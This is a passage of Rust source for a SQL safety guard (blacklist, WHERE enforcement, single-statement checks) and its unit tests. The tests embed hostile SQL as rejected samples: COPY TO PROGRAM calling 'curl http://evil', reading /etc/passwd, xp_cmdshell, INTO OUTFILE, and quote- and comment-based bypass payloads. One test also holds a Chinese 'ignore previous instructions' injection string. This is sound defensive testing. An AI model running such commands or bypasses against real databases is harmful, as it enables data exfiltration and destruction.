            if tokens.iter().skip(1).any(|token| {
                token.depth == 0 && token_name(token).is_some_and(|name| name == "WRITABLE_SCHEMA")
            }) =>
        {
            Some("PRAGMA writable_schema is not allowed".to_string())
        }
        "SELECT"
            if top_word_pair(&top, "INTO", "OUTFILE")
                || top_word_pair(&top, "INTO", "DUMPFILE") =>
        {
            Some("SELECT ... INTO OUTFILE/DUMPFILE is not allowed".to_string())
        }
        _ => None,
    }
}

fn top_word_pair(top: &[&Token<'_>], first: &str, second: &str) -> bool {
    top.windows(2).any(|pair| {
        pair[0].kind == TokenKind::Word
            && pair[1].kind == TokenKind::Word
            && pair[0].text.eq_ignore_ascii_case(first)
            && pair[1].text.eq_ignore_ascii_case(second)
    })
}

/// token 的“名字”：普通词直接大写；引号标识符去掉引号并还原双写转义。
/// 仅用于黑名单比对，不参与分类；字符串字面量返回 None。
fn token_name(token: &Token<'_>) -> Option<String> {
    match token.kind {
        TokenKind::Word => Some(token.text.to_ascii_uppercase()),
        TokenKind::QuotedIdentifier => Some(unquote_identifier(token.text).to_ascii_uppercase()),
        _ => None,
    }
}

fn unquote_identifier(text: &str) -> String {
    if text.len() < 2 {
        return text.to_string();
    }
    let close = match text.as_bytes().first() {
        Some(b'"') => '"',
        Some(b'`') => '`',
        Some(b'[') => ']',
        _ => return text.to_string(),
    };
    let inner = &text[1..text.len() - 1];
    inner.replace(&format!("{close}{close}"), &close.to_string())
}

/// `xp_cmdshell` 作为普通词出现即命中；引号标识符形式（`[xp_cmdshell]`）
/// 只在后面紧跟 `(` 时命中，避免把同名列误判为函数调用。
fn is_xp_cmdshell_call(tokens: &[Token<'_>]) -> bool {
    tokens.iter().enumerate().any(|(index, token)| {
        if token_name(token).as_deref() != Some("XP_CMDSHELL") {
            return false;
        }
        token.kind == TokenKind::Word
            || tokens
                .get(index + 1)
                .is_some_and(|next| next.kind == TokenKind::Punct && next.text == "(")
    })
}

fn is_privileged_set(words: &[String]) -> bool {
    match words.get(1).map(String::as_str) {
        Some("ROLE") => true,
        Some("LOCAL") => words.get(2).is_some_and(|word| word == "ROLE"),
        Some("SESSION") => words
            .get(2)
            .is_some_and(|word| word == "ROLE" || word == "AUTHORIZATION"),
        _ => false,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use lc_proto::ErrorCode;

    fn ok(sql: &str) -> GuardedSql {
        match SqlGuard::default().check(sql, false) {
            Ok(guarded) => guarded,
            Err(error) => panic!("expected SQL to pass: {sql:?}, got {error}"),
        }
    }

    fn error(sql: &str) -> SqlError {
        match SqlGuard::default().check(sql, false) {
            Ok(guarded) => panic!("expected SQL to be rejected: {sql:?}, got {guarded:?}"),
            Err(error) => error,
        }
    }

    fn ok_read_only(sql: &str) -> GuardedSql {
        match SqlGuard::default().check(sql, true) {
            Ok(guarded) => guarded,
            Err(error) => panic!("expected read-only SQL to pass: {sql:?}, got {error}"),
        }
    }

    fn error_read_only(sql: &str) -> SqlError {
        match SqlGuard::default().check(sql, true) {
            Ok(guarded) => {
                panic!("expected read-only SQL to be rejected: {sql:?}, got {guarded:?}")
            }
            Err(error) => error,
        }
    }

    fn assert_missing_where(sql: &str, verb: &str) {
        match error(sql) {
            SqlError::MissingWhere { statement } => assert_eq!(statement, verb),
            other => panic!("expected MissingWhere for {sql:?}, got {other:?}"),
        }
    }

    fn assert_blacklisted(sql: &str) {
        match error(sql) {
            SqlError::Blacklisted { .. } => {}
            other => panic!("expected Blacklisted for {sql:?}, got {other:?}"),
        }
    }

    // ==== LIMIT 注入 ====

    #[test]
    fn select_gets_default_limit() {
        let guarded = ok("SELECT * FROM users");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(guarded.injected_limit);
        assert_eq!(guarded.sql, "SELECT * FROM users LIMIT 100");
    }

    #[test]
    fn select_keeps_existing_limit() {
        let guarded = ok("SELECT * FROM users LIMIT 5");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(!guarded.injected_limit);
        assert_eq!(guarded.sql, "SELECT * FROM users LIMIT 5");
    }

    #[test]
    fn limit_detection_is_case_insensitive() {
        let guarded = ok("select * from users limit 5");
        assert!(!guarded.injected_limit);
        assert_eq!(guarded.sql, "select * from users limit 5");
    }

    #[test]
    fn fetch_first_suppresses_limit() {
        let guarded = ok("SELECT * FROM users FETCH FIRST 5 ROWS ONLY");
        assert!(!guarded.injected_limit);
        assert_eq!(guarded.sql, "SELECT * FROM users FETCH FIRST 5 ROWS ONLY");
    }

    #[test]
    fn top_suppresses_limit() {
        let guarded = ok("SELECT TOP 5 * FROM users");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(!guarded.injected_limit);
    }

    #[test]
    fn column_named_top_does_not_suppress_limit() {
        let guarded = ok("SELECT top FROM users");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(guarded.injected_limit);
        assert_eq!(guarded.sql, "SELECT top FROM users LIMIT 100");

        let qualified = ok("SELECT users.top FROM users");
        assert!(qualified.injected_limit);
    }

    #[test]
    fn column_named_limit_or_fetch_does_not_suppress_limit() {
        let limit_column = ok("SELECT limit FROM users");
        assert!(limit_column.injected_limit);
        assert_eq!(limit_column.sql, "SELECT limit FROM users LIMIT 100");

        let limit_in_where = ok("SELECT * FROM users WHERE limit = 5");
        assert!(limit_in_where.injected_limit);

        let fetch_column = ok("SELECT fetch FROM users");
        assert!(fetch_column.injected_limit);
    }

    #[test]
    fn top_expression_and_parameter_forms_are_preserved() {
        let top_expr = ok("SELECT TOP (5) * FROM users");
        assert!(!top_expr.injected_limit);

        let top_distinct = ok("SELECT DISTINCT TOP 5 * FROM users");
        assert!(!top_distinct.injected_limit);

        let named = ok("SELECT * FROM users LIMIT :count");
        assert!(!named.injected_limit);

        let positional = ok("SELECT * FROM users LIMIT ?");
        assert!(!positional.injected_limit);

        let fetch_next = ok("SELECT * FROM users ORDER BY id FETCH NEXT 5 ROWS ONLY");
        assert!(!fetch_next.injected_limit);
    }

    #[test]
    fn limit_in_subquery_still_limits_outer_query() {
        let guarded = ok("SELECT * FROM (SELECT id FROM users LIMIT 1) AS recent");
        assert!(guarded.injected_limit);
        assert_eq!(
            guarded.sql,
            "SELECT * FROM (SELECT id FROM users LIMIT 1) AS recent LIMIT 100"
        );
    }

    #[test]
    fn explain_select_is_not_injected() {
        let guarded = ok("EXPLAIN SELECT * FROM users");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(!guarded.injected_limit);
        assert_eq!(guarded.sql, "EXPLAIN SELECT * FROM users");
    }

    #[test]
    fn explain_analyze_delete_is_write() {
        let guarded = ok("EXPLAIN ANALYZE DELETE FROM users WHERE id = 1");
        assert_eq!(guarded.kind, SqlKind::Write);
        assert!(!guarded.injected_limit);
        assert_eq!(
            guarded.sql,
            "EXPLAIN ANALYZE DELETE FROM users WHERE id = 1"
        );

        assert_missing_where("EXPLAIN ANALYZE DELETE FROM users", "DELETE");
    }

    #[test]
    fn default_limit_is_clamped_to_one_through_thousand() {
        assert_eq!(SqlGuard::default().default_limit(), 100);
        assert_eq!(SqlGuard::with_default_limit(0).default_limit(), 1);
        assert_eq!(SqlGuard::with_default_limit(5000).default_limit(), 1000);
        assert_eq!(SqlGuard::with_default_limit(500).default_limit(), 500);

        let guarded = SqlGuard::with_default_limit(5000)
            .check("SELECT 1", false)
            .expect("select should pass");
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 1000");
    }

    // ==== 单语句 ====

    #[test]
    fn trailing_semicolon_is_accepted() {
        let guarded = ok("SELECT 1;");
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 100");
        assert!(guarded.injected_limit);
    }

    #[test]
    fn empty_statements_are_ignored() {
        let guarded = ok(" ; ; SELECT 1 ; ; ");
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 100");
    }

    #[test]
    fn empty_input_is_rejected() {
        assert!(matches!(error(""), SqlError::EmptyStatement));
        assert!(matches!(error("   \n\t"), SqlError::EmptyStatement));
    }

    #[test]
    fn comment_only_input_is_rejected() {
        assert!(matches!(
            error("  -- only a comment\n"),
            SqlError::EmptyStatement
        ));
        assert!(matches!(
            error("/* only a comment */"),
            SqlError::EmptyStatement
        ));
    }

    #[test]
    fn multiple_statements_are_rejected() {
        match error("SELECT 1; SELECT 2") {
            SqlError::MultipleStatements { count } => assert_eq!(count, 2),
            other => panic!("unexpected error: {other:?}"),
        }
        match error("SELECT 1; DELETE FROM users") {
            SqlError::MultipleStatements { count } => assert_eq!(count, 2),
            other => panic!("unexpected error: {other:?}"),
        }
    }

    #[test]
    fn semicolon_in_string_does_not_split() {
        let guarded = ok("SELECT ';' AS separator");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert_eq!(guarded.sql, "SELECT ';' AS separator LIMIT 100");
    }

    #[test]
    fn semicolon_in_line_comment_does_not_split() {
        let guarded = ok("SELECT 1 -- ; not a separator\n");
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 100");
    }

    #[test]
    fn semicolon_in_block_comment_does_not_split() {
        let guarded = ok("SELECT 1 /* ; */");
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 100");
    }

    #[test]
    fn semicolon_in_quoted_identifier_does_not_split() {
        let guarded = ok("SELECT \";\" AS semi");
        assert_eq!(guarded.sql, "SELECT \";\" AS semi LIMIT 100");
    }

    #[test]
    fn escaped_quotes_are_opaque() {
        let single = ok("SELECT 'It''s fine' AS note");
        assert_eq!(single.kind, SqlKind::Read);
        assert_eq!(single.sql, "SELECT 'It''s fine' AS note LIMIT 100");

        let identifier = ok("SELECT \"a\"\"b\" FROM users");
        assert_eq!(identifier.kind, SqlKind::Read);
        assert_eq!(identifier.sql, "SELECT \"a\"\"b\" FROM users LIMIT 100");
    }

    #[test]
    fn default_dialect_is_sqlite_and_backslash_is_not_an_escape() {
        let guard = SqlGuard::default();
        assert_eq!(guard.dialect(), SqlDialect::Sqlite);

        // SQLite 在反斜杠后的单引号处结束字符串，`''` 才是转义。
        let guarded = ok("SELECT 'a\\' AS note");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert_eq!(guarded.sql, "SELECT 'a\\' AS note LIMIT 100");

        let doubled = ok("SELECT 'a''b' AS note");
        assert_eq!(doubled.sql, "SELECT 'a''b' AS note LIMIT 100");
    }

    #[test]
    fn mysql_dialect_is_opt_in() {
        let guard = SqlGuard::default().with_dialect(SqlDialect::Mysql);
        assert_eq!(guard.dialect(), SqlDialect::Mysql);

        let guarded = guard
            .check("SELECT 'a\\'b' AS note", false)
            .expect("MySQL 方言按反斜杠转义解析");
        assert_eq!(guarded.sql, "SELECT 'a\\'b' AS note LIMIT 100");
    }

    #[test]
    fn backslash_quote_payload_cannot_hide_missing_where() {
        // C2 PoC：MySQL 词法会把第一条语句看成带顶层 WHERE，SQLite 实际在
        // `\'` 处结束字符串，`;` 后的 SELECT 才是第二条语句。
        assert!(
            SqlGuard::default()
                .check("DELETE FROM t RETURNING 'a\\' ; SELECT ' WHERE 1=1", false)
                .is_err()
        );

        // 截断到单条语句时，SQLite 解析后确实没有 WHERE。
        assert_missing_where("DELETE FROM t RETURNING 'a\\'", "DELETE");
        assert_missing_where("UPDATE t SET x = 'a\\' RETURNING x", "UPDATE");
    }

    #[test]
    fn limit_in_string_or_comment_does_not_suppress_injection() {
        let from_string = ok("SELECT 'LIMIT 5' AS note");
        assert!(from_string.injected_limit);
        assert_eq!(from_string.sql, "SELECT 'LIMIT 5' AS note LIMIT 100");

        let from_comment = ok("SELECT 1 /* LIMIT 5 */");
        assert!(from_comment.injected_limit);
        assert_eq!(from_comment.sql, "SELECT 1 LIMIT 100");
    }

    // ==== WHERE 拦截 ====

    #[test]
    fn update_with_where_is_allowed() {
        let guarded = ok("UPDATE users SET name = 'a' WHERE id = 1");
        assert_eq!(guarded.kind, SqlKind::Write);
        assert!(!guarded.injected_limit);
        assert_eq!(guarded.sql, "UPDATE users SET name = 'a' WHERE id = 1");
    }

    #[test]
    fn update_without_where_is_rejected() {
        assert_missing_where("UPDATE users SET name = 'a'", "UPDATE");
    }

    #[test]
    fn delete_with_where_is_allowed() {
        let guarded = ok("DELETE FROM users WHERE id = 1");
        assert_eq!(guarded.kind, SqlKind::Write);
        assert!(!guarded.injected_limit);
    }

    #[test]
    fn delete_without_where_is_rejected() {
        assert_missing_where("DELETE FROM users", "DELETE");
    }

    #[test]
    fn subquery_where_does_not_count_for_update() {
        assert_missing_where(
            "UPDATE users SET x = (SELECT y FROM other WHERE other.id = users.id)",
            "UPDATE",
        );
    }

    #[test]
    fn commented_where_does_not_count() {
        assert_missing_where("UPDATE users SET x = 1 -- WHERE id = 1", "UPDATE");
        assert_missing_where("DELETE FROM users /* WHERE id = 1 */", "DELETE");
    }

    #[test]
    fn string_where_does_not_count() {
        assert_missing_where("UPDATE users SET x = 'WHERE 1=1'", "UPDATE");

        let guarded = ok("DELETE FROM users WHERE note = 'WHERE id = 1'");
        assert_eq!(guarded.kind, SqlKind::Write);
    }
    #[test]
    fn quoted_where_identifier_does_not_count() {
        assert_missing_where("UPDATE users SET \"where\" = 1", "UPDATE");
        assert_missing_where("UPDATE users SET `where` = 1", "UPDATE");
        assert_missing_where("UPDATE [users] SET [where] = 1", "UPDATE");
    }

    #[test]
    fn quoted_where_column_in_condition_is_fine() {
        let guarded = ok("DELETE FROM users WHERE \"where\" = 1");
        assert_eq!(guarded.kind, SqlKind::Write);
    }

    // ==== CREATE TRIGGER 体 ====

    #[test]
    fn create_trigger_without_where_is_rejected() {
        assert_missing_where(
            "CREATE TRIGGER wipe AFTER INSERT ON users BEGIN DELETE FROM users; END",
            "DELETE",
        );
        assert_missing_where(
            "CREATE TEMP TRIGGER wipe AFTER UPDATE ON users BEGIN UPDATE users SET name = 'x'; END",
            "UPDATE",
        );
        assert_missing_where(
            "CREATE TRIGGER wipe AFTER INSERT ON users BEGIN INSERT INTO log VALUES (1); DELETE FROM users; END",
            "DELETE",
        );
    }

    #[test]
    fn create_trigger_with_where_is_allowed() {
        for sql in [
            "CREATE TRIGGER cleanup AFTER INSERT ON users BEGIN DELETE FROM sessions WHERE user_id = new.id; END",
            "CREATE TRIGGER cleanup BEFORE UPDATE ON users BEGIN UPDATE users SET touched = 1 WHERE id = old.id; END",
            "CREATE TEMPORARY TRIGGER cleanup AFTER DELETE ON users BEGIN DELETE FROM sessions WHERE user_id = old.id; END",
        ] {
            let guarded = ok(sql);
            assert_eq!(guarded.kind, SqlKind::Ddl, "kind for {sql:?}");
            assert!(!guarded.injected_limit, "limit for {sql:?}");
            assert_eq!(guarded.sql, sql);
        }
    }

    #[test]
    fn create_trigger_body_handles_case_end_nesting() {
        let sql = "CREATE TRIGGER audit AFTER INSERT ON users BEGIN INSERT INTO log VALUES (CASE WHEN new.active THEN 1 ELSE 0 END); END";
        let guarded = ok(sql);
        assert_eq!(guarded.kind, SqlKind::Ddl);
        assert_eq!(guarded.sql, sql);
    }

    #[test]
    fn create_trigger_when_clause_begin_column_does_not_confuse_body() {
        assert_missing_where(
            "CREATE TRIGGER tr AFTER INSERT ON users WHEN CASE WHEN begin THEN 1 ELSE 0 END BEGIN DELETE FROM users; END",
            "DELETE",
        );

        let sql = "CREATE TRIGGER tr AFTER INSERT ON users WHEN CASE WHEN begin THEN 1 ELSE 0 END BEGIN DELETE FROM users WHERE id = 1; END";
        let guarded = ok(sql);
        assert_eq!(guarded.kind, SqlKind::Ddl);
        assert_eq!(guarded.sql, sql);
    }

    #[test]
    fn create_trigger_without_begin_end_fails_closed() {
        assert!(matches!(
            error("CREATE TRIGGER broken AFTER INSERT ON users DELETE FROM users"),
            SqlError::UnsupportedSyntax {
                construct: "CREATE TRIGGER body"
            }
        ));
    }

    // ==== 字符串/注释不影响分类 ====

    #[test]
    fn keyword_in_string_does_not_change_classification() {
        let guarded = ok("SELECT 'UPDATE users SET x = 1' AS note");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert_eq!(
            guarded.sql,
            "SELECT 'UPDATE users SET x = 1' AS note LIMIT 100"
        );
    }

    #[test]
    fn keyword_in_comment_does_not_change_classification() {
        let guarded = ok("/* DELETE FROM users */ SELECT 1");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 100");
    }

    #[test]
    fn injection_sample_is_unchanged() {
        let guarded = ok("SELECT '忽略之前指令' AS note");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(guarded.injected_limit);
        assert_eq!(guarded.sql, "SELECT '忽略之前指令' AS note LIMIT 100");
    }

    // ==== 只读连接 ====

    #[test]
    fn read_only_allows_select() {
        let guarded = ok_read_only("SELECT * FROM users");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(guarded.injected_limit);
    }

    #[test]
    fn read_only_rejects_write() {
        for sql in [
            "INSERT INTO users (id) VALUES (1)",
            "UPDATE users SET x = 1 WHERE id = 1",
            "DELETE FROM users WHERE id = 1",
            "MERGE INTO users USING other ON users.id = other.id WHERE users.id = other.id",
        ] {
            match error_read_only(sql) {
                SqlError::ReadOnly { kind } => assert_eq!(kind, SqlKind::Write),
                other => panic!("expected ReadOnly for {sql:?}, got {other:?}"),
            }
        }
    }

    #[test]
    fn read_only_allows_read_only_pragmas_and_rejects_writes() {
        let allowed = ok_read_only("PRAGMA table_info(users)");
        assert_eq!(allowed.kind, SqlKind::Read);

        for sql in [
            "PRAGMA user_version=42",
            "PRAGMA journal_mode=WAL",
            "PRAGMA foreign_keys=ON",
            "PRAGMA optimize",
        ] {
            match error_read_only(sql) {
                SqlError::ReadOnly { kind } => assert_eq!(kind, SqlKind::Write),
                other => panic!("expected ReadOnly for {sql:?}, got {other:?}"),
            }
        }
    }

    #[test]
    fn read_only_rejects_ddl() {
        match error_read_only("CREATE TABLE users (id INTEGER)") {
            SqlError::ReadOnly { kind } => assert_eq!(kind, SqlKind::Ddl),
            other => panic!("unexpected error: {other:?}"),
        }
    }

    #[test]
    fn read_only_rejects_unknown() {
        match error_read_only("VACUUM") {
            SqlError::ReadOnly { kind } => assert_eq!(kind, SqlKind::Unknown),
            other => panic!("unexpected error: {other:?}"),
        }
    }

    // ==== 分类 fail-closed ====

    #[test]
    fn unknown_statement_fails_closed() {
        match error("VACUUM") {
            SqlError::UnknownStatement { head } => assert_eq!(head, "VACUUM"),
            other => panic!("unexpected error: {other:?}"),
        }
        assert!(matches!(
            error("EXPLAIN"),
            SqlError::UnknownStatement { .. }
        ));
        assert!(matches!(
            error("CALL refresh_stats()"),
            SqlError::UnknownStatement { .. }
        ));
    }

    #[test]
    fn writable_connection_allows_plain_write_and_ddl() {
        let insert = ok("INSERT INTO users (id) VALUES (1)");
        assert_eq!(insert.kind, SqlKind::Write);
        assert!(!insert.injected_limit);

        let ddl = ok("CREATE TABLE users (id INTEGER)");
        assert_eq!(ddl.kind, SqlKind::Ddl);
        assert!(!ddl.injected_limit);

        let drop_table = ok("DROP TABLE users");
        assert_eq!(drop_table.kind, SqlKind::Ddl);

        let raw = ok("SELECT 1");
        assert_eq!(raw.kind, SqlKind::Read);
    }

    #[test]
    fn show_describe_and_read_only_pragmas_are_read_without_limit() {
        for sql in [
            "SHOW TABLES",
            "DESCRIBE users",
            "PRAGMA table_info(users)",
            "PRAGMA main.table_info(users)",
            "PRAGMA \"main\".\"table_info\"(\"users\")",
            "PRAGMA index_list(users)",
            "PRAGMA index_info(idx_users_name)",
            "PRAGMA foreign_key_list(users)",
            "PRAGMA database_list",
            "PRAGMA compile_options",
        ] {
            let guarded = ok(sql);
            assert_eq!(guarded.kind, SqlKind::Read, "kind for {sql:?}");
            assert!(!guarded.injected_limit, "limit for {sql:?}");
            assert_eq!(guarded.sql, sql);
        }
    }

    #[test]
    fn pragma_assignment_and_unknown_names_are_write() {
        for sql in [
            "PRAGMA user_version=42",
            "PRAGMA user_version = 42",
            "PRAGMA main.user_version = 42",
            "PRAGMA journal_mode=WAL",
            "PRAGMA journal_mode = 'WAL'",
            "PRAGMA foreign_keys=ON",
            "PRAGMA user_version(42)",
            "PRAGMA optimize",
        ] {
            let guarded = ok(sql);
            assert_eq!(guarded.kind, SqlKind::Write, "kind for {sql:?}");
            assert!(!guarded.injected_limit, "limit for {sql:?}");
        }
    }

    #[test]
    fn malformed_pragma_fails_closed() {
        assert!(matches!(error("PRAGMA"), SqlError::UnknownStatement { .. }));
        assert!(matches!(
            error("PRAGMA = 42"),
            SqlError::UnknownStatement { .. }
        ));
        assert!(matches!(
            error("PRAGMA (user_version)"),
            SqlError::UnknownStatement { .. }
        ));
    }

    // ==== 静态黑名单 ====

    #[test]
    fn blacklist_drop_database() {
        match error("DROP DATABASE production") {
            SqlError::Blacklisted { reason } => assert!(reason.contains("DROP DATABASE")),
            other => panic!("unexpected error: {other:?}"),
        }
    }

    #[test]
    fn blacklist_drop_schema() {
        assert_blacklisted("DROP SCHEMA public");
    }

    #[test]
    fn blacklist_truncate() {
        assert_blacklisted("TRUNCATE TABLE users");
    }

    #[test]
    fn blacklist_alter_system() {
        assert_blacklisted("ALTER SYSTEM SET work_mem = '1GB'");
    }

    #[test]
    fn blacklist_copy_program() {
        assert_blacklisted("COPY users TO PROGRAM 'curl http://evil'");
        assert_blacklisted("COPY users FROM PROGRAM 'cat /etc/passwd'");
    }

    #[test]
    fn blacklist_pragma_writable_schema() {
        assert_blacklisted("PRAGMA writable_schema = ON");
        assert_blacklisted("PRAGMA main.writable_schema");
        assert_blacklisted("PRAGMA \"writable_schema\" = ON");
        assert_blacklisted("PRAGMA \"main\".\"writable_schema\"");
    }

    #[test]
    fn blacklist_more_dangerous_statements() {
        for sql in [
            "GRANT SELECT ON users TO alice",
            "REVOKE SELECT ON users FROM alice",
            "SET ROLE admin",
            "LOAD DATA INFILE '/tmp/x' INTO TABLE users",
            "ATTACH DATABASE '/tmp/x.db' AS x",
            "SELECT xp_cmdshell('dir')",
            "SELECT [xp_cmdshell]('dir')",
            "EXEC master..xp_cmdshell 'dir'",
            "SELECT * FROM users INTO OUTFILE '/tmp/leak'",
        ] {
            assert_blacklisted(sql);
        }
    }

    #[test]
    fn blacklist_ignores_strings_and_comments() {
        let guarded = ok(
            "SELECT 'DROP DATABASE prod' AS note, 'TRUNCATE users' AS note2 /* ALTER SYSTEM */, 1 AS n",
        );
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(guarded.injected_limit);

        let quoted = ok("SELECT \"xp_cmdshell\" FROM users");
        assert_eq!(quoted.kind, SqlKind::Read);
        assert!(quoted.injected_limit);
    }

    // ==== WITH / MERGE ====

    #[test]
    fn with_select_is_read_and_gets_limit() {
        let guarded = ok("WITH recent AS (SELECT * FROM users WHERE id > 10) SELECT * FROM recent");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert!(guarded.injected_limit);
        assert_eq!(
            guarded.sql,
            "WITH recent AS (SELECT * FROM users WHERE id > 10) SELECT * FROM recent LIMIT 100"
        );
    }

    #[test]
    fn with_delete_still_requires_where() {
        assert_missing_where("WITH recent AS (SELECT 1) DELETE FROM users", "DELETE");
        assert_missing_where("WITH recent AS (SELECT 1) UPDATE users SET x = 1", "UPDATE");

        let allowed = ok("WITH recent AS (SELECT 1) DELETE FROM users WHERE id = 1");
        assert_eq!(allowed.kind, SqlKind::Write);
        assert!(!allowed.injected_limit);
    }

    #[test]
    fn with_insert_is_write() {
        let guarded = ok("WITH recent AS (SELECT 1) INSERT INTO archive SELECT * FROM recent");
        assert_eq!(guarded.kind, SqlKind::Write);
        assert!(!guarded.injected_limit);
        assert_eq!(
            guarded.sql,
            "WITH recent AS (SELECT 1) INSERT INTO archive SELECT * FROM recent"
        );
    }

    #[test]
    fn merge_requires_where() {
        assert_missing_where(
            "MERGE INTO target USING source ON target.id = source.id WHEN MATCHED THEN UPDATE SET x = 1",
            "MERGE",
        );

        let guarded = ok(
            "MERGE INTO target USING source ON target.id = source.id WHERE source.x = 1 WHEN MATCHED THEN UPDATE SET x = 1",
        );
        assert_eq!(guarded.kind, SqlKind::Write);
        assert!(!guarded.injected_limit);
    }

    #[test]
    fn data_modifying_cte_is_write() {
        let guarded = ok(
            "WITH changed AS (INSERT INTO archive SELECT * FROM users RETURNING *) SELECT * FROM changed",
        );
        assert_eq!(guarded.kind, SqlKind::Write);
        assert!(!guarded.injected_limit);

        match SqlGuard::default().check(
            "WITH changed AS (DELETE FROM users RETURNING *) SELECT * FROM changed",
            true,
        ) {
            Err(SqlError::ReadOnly { kind }) => assert_eq!(kind, SqlKind::Write),
            other => panic!("expected ReadOnly for data-modifying CTE, got {other:?}"),
        }
        assert_missing_where(
            "WITH changed AS (DELETE FROM users RETURNING *) SELECT * FROM changed",
            "DELETE",
        );
        // 主查询的 WHERE 不能替 CTE 内的 DELETE 承担条件。
        assert_missing_where(
            "WITH changed AS (DELETE FROM users RETURNING *) SELECT * FROM changed WHERE true",
            "DELETE",
        );

        let scoped = ok(
            "WITH changed AS (DELETE FROM users WHERE id = 1 RETURNING *) SELECT * FROM changed",
        );
        assert_eq!(scoped.kind, SqlKind::Write);
        assert!(!scoped.injected_limit);

        match SqlGuard::default().check(
            "EXPLAIN WITH changed AS (DELETE FROM users RETURNING *) SELECT * FROM changed",
            true,
        ) {
            Err(SqlError::ReadOnly { kind }) => assert_eq!(kind, SqlKind::Write),
            other => panic!("expected ReadOnly for EXPLAIN data-modifying CTE, got {other:?}"),
        }
    }

    // ==== 引号/注释/美元符号 ====

    #[test]
    fn dollar_quoted_payload_is_not_treated_as_a_string() {
        // SQLite 没有 Postgres dollar-quoted 字符串；`$$` 只是参数前缀，
        // `;` 必须被识别为语句分隔符，不能把后续 SELECT/WHERE 藏起来。
        assert!(matches!(
            error("SELECT $$a;b -- WHERE$$ AS body"),
            SqlError::MultipleStatements { .. }
        ));
        assert!(matches!(
            error("DELETE FROM t RETURNING $$ ; SELECT $$ WHERE 1=1"),
            SqlError::MultipleStatements { .. }
        ));

        // `$name` 形式的参数仍是普通词，不影响顶层 WHERE 判定。
        let guarded = ok("SELECT * FROM users WHERE id = $id");
        assert_eq!(guarded.kind, SqlKind::Read);
        assert_eq!(guarded.sql, "SELECT * FROM users WHERE id = $id LIMIT 100");
    }

    #[test]
    fn do_block_is_not_accepted_by_sqlite_dialect() {
        assert!(matches!(
            error("DO $$ BEGIN DELETE FROM users; END $$"),
            SqlError::MultipleStatements { .. }
        ));
    }

    #[test]
    fn nested_block_comment_cannot_hide_statement_boundary() {
        // SQLite 在第一个 `*/` 结束注释；后面的 `;` 必须切分语句，不能让
        // 顶层 WHERE 替第一条无 WHERE 的 DELETE 作保。
        assert!(matches!(
            error("DELETE FROM t RETURNING 1 /* /* */ ; SELECT 1 */ WHERE 1=1"),
            SqlError::MultipleStatements { .. }
        ));

        let guarded = ok("SELECT 1 /* comment */");
        assert_eq!(guarded.sql, "SELECT 1 LIMIT 100");
    }

    #[test]
    fn nul_byte_is_rejected_even_with_where_after_it() {
        // node:sqlite 在 NUL 处截断，不能让它前面的 DELETE 无 WHERE 执行。
        assert!(matches!(
            error("DELETE FROM t RETURNING 1\0 WHERE 1=1"),
            SqlError::UnsupportedSyntax {
                construct: "NUL byte"
            }
        ));
        assert!(matches!(
            error("SELECT 1\0"),
            SqlError::UnsupportedSyntax {
                construct: "NUL byte"
            }
        ));
    }

    #[test]
    fn unterminated_literals_are_rejected() {
        assert!(matches!(
            error("SELECT 'abc"),
            SqlError::Unterminated {
                construct: "string literal"
            }
        ));
        assert!(matches!(
            error("SELECT 1 /* abc"),
            SqlError::Unterminated {
                construct: "block comment"
            }
        ));
    }

    #[test]
    fn hash_syntax_is_rejected_conservatively() {
        assert!(matches!(
            error("SELECT 1 # comment"),
            SqlError::UnsupportedSyntax { .. }
        ));
    }

    #[test]
    fn mysql_executable_comment_is_rejected_but_hints_are_not() {
        assert!(matches!(
            error("SELECT 1 /*!50000 UNION SELECT 2 */"),
            SqlError::UnsupportedSyntax { .. }
        ));

        let hinted = ok("SELECT 1 /*+ NO_INDEX */");
        assert_eq!(hinted.kind, SqlKind::Read);
        assert!(hinted.injected_limit);
    }

    // ==== 错误码映射 ====

    #[test]
    fn error_codes_map_to_contract() {
        assert_eq!(SqlError::EmptyStatement.code(), ErrorCode::InvalidArgument);
        assert_eq!(
            SqlError::MultipleStatements { count: 2 }.code(),
            ErrorCode::InvalidArgument
        );
        assert_eq!(
            SqlError::ReadOnly {
                kind: SqlKind::Write
            }
            .code(),
            ErrorCode::PermissionDenied
        );
        assert_eq!(
            SqlError::MissingWhere {
                statement: "UPDATE".to_string()
            }
            .code(),
            ErrorCode::PermissionDenied
        );
        assert_eq!(
            SqlError::Blacklisted {
                reason: "x".to_string()
            }
            .code(),
            ErrorCode::PermissionDenied
        );
        assert_eq!(
            SqlError::UnknownStatement {
                head: "VACUUM".to_string()
            }
            .code(),
            ErrorCode::PermissionDenied
        );
        assert_eq!(
            SqlError::Unterminated {
                construct: "string literal"
            }
            .code(),
            ErrorCode::InvalidArgument
        );
        assert_eq!(
            SqlError::UnsupportedSyntax { construct: "test" }.code(),
            ErrorCode::InvalidArgument
        );

        let body = SqlError::MissingWhere {
            statement: "DELETE".to_string(),
        }
        .to_error_body();
        assert_eq!(body.code, ErrorCode::PermissionDenied);
        assert!(body.message.contains("WHERE"));
    }
}
